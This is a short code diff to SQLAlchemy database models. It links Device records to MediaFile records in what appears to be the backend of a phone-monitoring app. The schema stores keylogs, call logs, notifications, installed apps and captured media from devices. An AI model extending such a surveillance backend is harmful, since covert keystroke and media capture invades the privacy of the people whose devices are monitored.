@@ -42,6 +42,7 @@ class Device(Base):
     installed_apps = relationship("InstalledApp", back_populates="device")
     notifications = relationship("Notification", back_populates="device")
     keylogs = relationship("Keylog", back_populates="device")
+    media_files = relationship("MediaFile", back_populates="device")
 
 class CallLog(Base):
     __tablename__ = "call_logs"
@@ -175,6 +176,8 @@ class MediaFile(Base):
     file_size = Column(Integer, default=0)
     captured_at = Column(BigInteger, default=0)
     created_at = Column(DateTime(timezone=True), default=func.now())
+    
+    device = relationship("Device", back_populates="media_files")
 
 class Keylog(Base):
     __tablename__ = "keylogs"
